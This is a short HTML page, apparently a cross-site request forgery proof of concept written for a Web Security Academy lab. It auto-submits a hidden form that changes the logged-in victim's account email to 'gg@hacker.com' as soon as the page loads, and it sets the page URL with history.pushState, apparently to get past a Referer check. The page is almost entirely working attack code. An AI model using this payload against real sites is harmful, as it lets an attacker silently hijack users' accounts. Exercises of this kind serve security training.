...
<html>
  ...
  <body>
    <form action="https://0a2c007703029387809a03f70010001e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="gg&#64;hacker&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a2c007703029387809a03f70010001e.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
